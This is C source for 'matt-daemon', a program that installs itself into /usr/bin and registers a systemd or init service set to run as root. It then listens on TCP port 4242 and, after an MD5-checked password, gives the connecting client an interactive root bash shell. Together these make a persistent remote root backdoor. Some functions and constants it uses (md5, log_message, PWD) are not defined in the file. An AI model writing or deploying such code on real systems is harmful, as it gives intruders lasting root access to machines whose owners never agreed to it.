#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pty.h>
#include <signal.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>


#define TARGET_PATH "/usr/bin/matt-daemon" 
#define SERVICE_PATH_SYSTEMD "/etc/systemd/system/matt-daemon.service" 
#define SERVICE_PATH_SYSVINIT "/etc/init.d/matt-daemon"
#define LOG_FILE_FOLDER "/var/log/matt-daemon/"
#define HELP "\
Help Menu:\n\
? - Shows help menu\n\
shell - Provides a root shell\n\
exit - Closes the connection\n\
clear - Clears the screen\n\
available - Shows the number of available connections\n"
#define PORT 4242

sem_t connection_semaphore;

int use_systemd()
{
    return access("/run/systemd/system", F_OK) == 0;
}

void copy_to_standard_location()
{
    char buffer[1024];
    ssize_t bytes_read, bytes_written;
    
    int source_fd = open("/proc/self/exe", O_RDONLY);
    if (source_fd < 0)
    {
        perror("Failed to open source binary");
        exit(EXIT_FAILURE);
    }

    int target_fd = open(TARGET_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (target_fd < 0)
    {
        perror("Failed to open target path");
        close(source_fd);
        exit(EXIT_FAILURE);
    }

    while ((bytes_read = read(source_fd, buffer, sizeof(buffer))) > 0)
    {
        bytes_written = write(target_fd, buffer, bytes_read);
        if (bytes_written != bytes_read)
        {
            perror("Failed to write complete data");
            close(source_fd);
            close(target_fd);
            exit(EXIT_FAILURE);
        }
    }

    close(source_fd);
    close(target_fd);
}

void create_service_file(int systemd_enabled)
{
    const char *service_content_systemd =
        "[Unit]\n"
        "Description=TODO.\n"
        "After=network.target\n\n"
        "[Service]\n"
        "ExecStart=" TARGET_PATH "\n"
        "Restart=always\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    const char *service_content_sysvinit =
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          Matt Daemon service\n"
        "# Required-Start:    $network\n"
        "# Required-Stop:     $network\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:      0 1 6\n"
        "# Short-Description: TODO.\n"
        "### END INIT INFO\n"
        "\n"
        "case \"$1\" in\n"
        "    start)\n"
        "        " TARGET_PATH " &\n"
        "        ;;\n"
        "    stop)\n"
        "        killall matt-daemon\n"
        "        ;;\n"
        "    *)\n"
        "        echo \"Usage: $0 {start|stop}\"\n"
        "        exit 1\n"
        "esac\n"
        "exit 0\n";

    const char *service_path = systemd_enabled ? SERVICE_PATH_SYSTEMD : SERVICE_PATH_SYSVINIT;
    const char *service_content = systemd_enabled ? service_content_systemd : service_content_sysvinit;

    int fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0)
    {
        perror("Failed to create service file");
        exit(EXIT_FAILURE);
    }

    int foo = write(fd, service_content, strlen(service_content));
    (void)foo;
    close(fd);
}

void setup_service(int systemd_enabled)
{
    int foo;
    if (systemd_enabled)
    {
        foo = system("systemctl daemon-reload");
        foo = system("systemctl enable matt-daemon");
        foo = system("systemctl start matt-daemon");
    }
    else
    {
        foo = system("chmod +x " SERVICE_PATH_SYSVINIT);
        foo = system("service matt-daemon start");
    }
    (void)foo;
}

static void md5_to_hex_string(const uint8_t *digest, char *out)
{
    for (int i = 0; i < 16; i++)
    {
        sprintf(&out[i * 2], "%02x", digest[i]);
    }
    out[32] = '\0';
}

static void handle_sigchld(int sig)
{
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0)
    {
        sem_post(&connection_semaphore);
    }
}

static int mid_state_promt(int client_socket)
{
    int shell = 0;
    char buffer[1024];

    while (1)
    {
        send(client_socket, "> ", 2, 0);

        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0)
        {
            if (bytes_received == 0)
            {
                printf("Connection closed by client.\n");
            }
            else
            {
                perror("recv");
            }
            break;
        }

        buffer[bytes_received - 1] = '\0';

        if (strcmp(buffer, "?") == 0)
        {
            send(client_socket, HELP, strlen(HELP), 0);
        }
        else if (strcmp(buffer, "shell") == 0)
        {
            shell = 1;
            break;
        }
        else if (strcmp(buffer, "exit") == 0)
        {
            break;
        }
        else if (strcmp(buffer, "clear") == 0)
        {
            const char* clear_command = "\033[H\033[J";
            send(client_socket, clear_command, strlen(clear_command), 0);
        }
        else if (strcmp(buffer, "available") == 0)
        {
            char sem_value_str[64];
            int sem_value;
            sem_getvalue(&connection_semaphore, &sem_value);
            sprintf(sem_value_str, "Available connections: %d\n", sem_value);
            send(client_socket, sem_value_str, strlen(sem_value_str), 0);
        }
        else if (strlen(buffer) == 0)
        {
            continue;
        }
        else
        {
            const char* invalid_command_message = "Invalid command. Type '?' for help.\n";
            send(client_socket, invalid_command_message, strlen(invalid_command_message), 0);
        }
    }

    return shell;
}

static void handle_client(int client_socket, const char *client_ip)
{
    char buffer[1024];
    int authenticated = 0;
    int shell = 0;
    size_t total_data_sent = 0;
    size_t total_data_received = 0;

    while (authenticated == 0)
    {
        send(client_socket, "Password: ", 10, 0);
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    
        if (bytes_received <= 0) 
            break;

        buffer[bytes_received - 1] = '\0';
        uint8_t digest[16];
        char pwd[33];
    
        md5((uint8_t *)buffer, strlen(buffer), (uint8_t *)digest);
        md5_to_hex_string(digest, pwd);
    
        if (strcmp(pwd, PWD) == 0)
        {
            authenticated = 1;
        }
        else
        {
            log_message(LOG_FILE_PATH, "Rejected connection from %s due to: Authentication failed.\n", client_ip);
        }
    }

    log_message(LOG_FILE_PATH, "Connection from %s received.\n", client_ip);

    shell = mid_state_promt(client_socket);

    if (authenticated && shell)
    {
        int master_fd;
        pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);  // Create a PTY for the child process
        if (pid == -1)
        {
            perror("forkpty failed");
            close(client_socket);
            return;
        }

        if (pid == 0)
        {
            setenv("TERM", "xterm-256color", 1);
            execl("/bin/bash", "/bin/bash", "-i", NULL);
            perror("execl failed");
            exit(EXIT_FAILURE);
        }
        else
        {
            fd_set fds;
            while (1)
            {
                FD_ZERO(&fds);
                FD_SET(client_socket, &fds);
                FD_SET(master_fd, &fds);

                if (select(master_fd + 1, &fds, NULL, NULL, NULL) < 0)
                {
                    perror("select failed");
                    break;
                }

                if (FD_ISSET(master_fd, &fds))
                {
                    int n = read(master_fd, buffer, sizeof(buffer));
                    if (n <= 0) break;
                    send(client_socket, buffer, n, 0);

                    total_data_sent += n;
                    
                    log_message(LOG_FILE_PATH, "Command output: %.*s", n, buffer);
                }

                if (FD_ISSET(client_socket, &fds))
                {
                    int n = recv(client_socket, buffer, sizeof(buffer), 0);
                    if (n <= 0) break;
                    int foo = write(master_fd, buffer, n);
                    (void)foo;
                    total_data_received += n;

                    log_message(LOG_FILE_PATH, "Command requested: %.*s", n, buffer);
                }
            }
            close(master_fd);
        }
    }

    log_message(LOG_FILE_PATH, "Session from %s ended. Data sent: %zd bytes, Data received: %zd bytes\n", client_ip, total_data_sent, total_data_received);

    close(client_socket);
}

static void daemon_main()
{
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_size = sizeof(client_addr);

    sem_init(&connection_semaphore, 0, 3);

    struct sigaction sa;
    sa.sa_handler = handle_sigchld;
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, NULL);


    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
    {
        perror("Bind faild");
        close(server_socket);
        exit(EXIT_SUCCESS);
    }

    if (listen(server_socket, 3) == -1)
    {
        perror("Listen failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        sem_wait(&connection_semaphore);

        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_size);
        if (client_socket == -1)
        {
            log_message(LOG_FILE_PATH, "Incomming connection refused due to: Accept Failed.\n");
            
            // perror("Accept failed");
            sem_post(&connection_semaphore);
            continue;
        }
        if (fork() == 0)
        {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));

            handle_client(client_socket, client_ip);
            close(server_socket);
            exit(EXIT_SUCCESS);
        }
    }

    close(server_socket);
    sem_destroy(&connection_semaphore);
}

int main()
{
    if (geteuid() != 0)
    {
        fprintf(stderr, "matt-daemon: This program must be run as root.\n");
        return -1;
    }

    int systemd_enabled = use_systemd();

    char exec_path[1024];
    ssize_t len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);

    if (len != -1)
    {
        exec_path[len] = '\0';
    }
    else
    {
        fprintf(stderr, "matt-daemon: Fatal error. Failed to read execution path\n");
        perror("Failed to read execution path");
        return -1;
    }

    /*
        We asume it's being executed by service handler.
    */
    if (strcmp(exec_path, TARGET_PATH) == 0)
    {
        daemon_main();
        return 0;
    }

    if (access(TARGET_PATH, F_OK) != 0)
    {
        copy_to_standard_location();
    }

    create_service_file(systemd_enabled);

    setup_service(systemd_enabled);

    return 0;
}
